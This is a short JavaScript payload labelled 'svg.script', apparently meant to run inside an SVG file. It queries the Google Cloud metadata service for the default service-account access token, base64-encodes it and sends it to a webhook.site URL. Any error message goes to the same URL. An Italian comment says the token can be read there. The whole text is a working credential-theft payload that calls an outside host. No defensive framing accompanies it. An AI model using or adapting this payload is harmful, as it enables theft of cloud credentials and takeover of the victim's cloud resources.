svg.script:

fetch('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', {
  headers: {'Metadata-Flavor': 'Google'}
})
.then(r => r.text())
.then(token => {
  // INVIA A WEBHOOK.SITE - dove puoi vedere il token!
  fetch('https://webhook.site/956eb152-d30c-4bc7-9f23-d10e0bd8e284?gcp_token=' + btoa(token));
})
.catch(e => {
  fetch('https://webhook.site/956eb152-d30c-4bc7-9f23-d10e0bd8e284?error=' + btoa(e.message));
});
